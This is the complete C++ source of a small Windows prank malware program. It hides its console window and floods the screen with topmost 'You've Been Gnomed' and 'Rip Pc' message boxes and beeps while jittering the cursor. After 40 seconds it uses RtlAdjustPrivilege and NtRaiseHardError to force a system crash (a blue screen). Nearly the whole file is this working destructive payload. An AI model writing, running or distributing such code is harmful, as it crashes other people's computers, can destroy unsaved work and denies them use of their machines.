#include <thread>
#include <conio.h>
#include <windows.h>
#include <synchapi.h>
#pragma comment(lib, "ntdll.lib")

void Sleep(
	DWORD dwMilliseconds
);



EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(
	ULONG    Privilege,
	BOOLEAN  Enable,
	BOOLEAN  CurrentThread,
	PBOOLEAN Enabled
	);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, 
	ULONG NumberOfParameters, 
	PULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, 
	ULONG ValidResponseOption, 
	PULONG Response
	);



void payload() {

	while (true) {

		MessageBoxA(0, "You'e Been Gnomed", "You've Been Gnomed", MB_TOPMOST | MB_ABORTRETRYIGNORE);
		MessageBoxA(0, "Rip Pc", "F", MB_TOPMOST | MB_ABORTRETRYIGNORE);	
		MessageBeep(MB_ICONINFORMATION);


	}
}

void MoveCursor(LPPOINT cursor, int x, int y) {


	SetCursorPos	(

		x + (rand() % 3 - 1),
		y + (rand() % 3 - 1)

	);

}

int main() {
	BOOLEAN bl;
	POINT cursor;
	unsigned long response;
	
	GetCursorPos(&cursor);
	int x = cursor.x;
	int y = cursor.y;
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	
	std::thread t1 (payload);
	while (true)
	{

		MoveCursor(&cursor, x, y);


		Sleep(40'000);
		RtlAdjustPrivilege(19, true, false, &bl);
		MessageBeep(MB_ICONINFORMATION);
		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

		t1.join();
	}
	return 0;
}